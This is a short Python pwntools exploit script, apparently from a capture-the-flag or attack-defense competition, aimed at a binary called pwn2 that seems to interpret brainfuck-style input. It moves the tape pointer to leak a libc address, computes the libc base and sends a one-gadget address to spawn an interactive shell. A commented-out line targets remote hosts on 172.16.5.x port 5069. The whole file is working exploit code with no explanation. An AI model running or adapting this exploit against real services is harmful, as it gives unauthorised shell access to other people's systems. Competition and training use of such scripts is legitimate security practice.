#coding:utf-8

import sys
from pwn import *
#from LibcSearcher import *
import time
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def debug(msg=''):
    gdb.attach(p,'')
    raw_input()

def exploit():
	p.recv()
	payload1 = "<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<.>.>.>.>.>.>.>.<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>,>,>,>,"
	p.sendline(payload1)
	leak_addr = p.recv(8).ljust(8,'\x00')
	leak_addr = u64(leak_addr)
	base_addr = leak_addr - libc.symbols['_IO_2_1_stderr_']
	bin_sh = next(libc.search('/bin/sh'))
	system = libc.symbols['system']
	payload2 = p32(0x0000400847)
	p.send(payload2)
	payload3 = '<<<<>,>,>,>,>,>,>,'
	p.sendline(payload3)
	payload4 = p64(base_addr + 0x45216)
	p.sendline(payload4)
	p.interactive()

if __name__ == '__main__':
		#p = remote('172.16.5.'+str(i),5069)	
		p=process('./pwn2')
		exploit()

